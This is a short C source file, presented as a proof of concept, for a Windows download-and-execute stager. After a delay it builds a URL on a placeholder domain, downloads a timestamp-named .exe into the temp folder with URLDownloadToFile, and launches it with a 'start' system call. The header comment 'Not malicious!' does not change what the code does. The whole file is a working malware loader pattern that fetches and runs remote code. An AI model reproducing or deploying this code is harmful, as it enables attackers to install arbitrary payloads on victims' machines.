//PoC only, no error checking, hardcoded stuff, etc. Not malicious!
#include <strsafe.h>
#include <Windows.h>
#include <tchar.h>

#pragma  comment(lib,"Urlmon.lib")
#define DOMAINNAME _T("something_random.test")
#define URLLEN 80 //some spare bytes

#define ISO_TIME_LEN 22
#define ISO_TIME_FORMAT  _T("%04i%02i%02iT%02i%02i%02i")

PTSTR SystemTimeToISO8601(SYSTEMTIME stTime)
{
	PTSTR pszISOTimeZ;
	pszISOTimeZ = LocalAlloc(LPTR, (ISO_TIME_LEN + 3) * sizeof(TCHAR));
	if (pszISOTimeZ)
	{
		StringCchPrintf(
			pszISOTimeZ,
			ISO_TIME_LEN + 3,
			ISO_TIME_FORMAT,
			stTime.wYear,
			stTime.wMonth,
			stTime.wDay,
			stTime.wHour,
			stTime.wMinute,
			stTime.wSecond);
	}
	return pszISOTimeZ;
}

PWSTR GetCurrentTimeZ(void)
{
	SYSTEMTIME stTime;
	GetSystemTime(&stTime);
	return (SystemTimeToISO8601(stTime));
}

int _tmain(int argc, _TCHAR** argv, _TCHAR** envp)
{
	// no error checking. no way do deal with them anyway.
	PTSTR pszTime;
	PTSTR pszUrl;
	PTSTR pszDest;
	PTSTR pszEnvDest;
	PTSTR pszStartDest;

	Sleep(2000);

	pszTime = GetCurrentTimeZ();
	pszUrl = LocalAlloc(LPTR,URLLEN * sizeof(TCHAR));
	pszDest = LocalAlloc(LPTR, MAX_PATH * sizeof(TCHAR));
	pszEnvDest = LocalAlloc(LPTR, MAX_PATH * sizeof(TCHAR));
	pszStartDest = LocalAlloc(LPTR, MAX_PATH * sizeof(TCHAR)); 

	if (!pszEnvDest || !pszUrl || !pszStartDest)
	{
		//crash, what else
		_exit(ERROR_NOT_ENOUGH_MEMORY);
	}

	StringCchPrintf(pszEnvDest, MAX_PATH, _T("%%temp%%\\%s.exe"), pszTime);
	ExpandEnvironmentStrings(pszEnvDest, pszDest, MAX_PATH);
	StringCchPrintf(pszUrl, URLLEN, _T("http://%s/v1/%s.exe"), DOMAINNAME, pszTime);
	StringCchPrintf(pszStartDest, MAX_PATH, _T("start %s"), pszDest);

	URLDownloadToFile(NULL, pszUrl, pszDest, 0, NULL);

	Sleep(3000);
	_tsystem(pszStartDest);
	Sleep(10000);
}
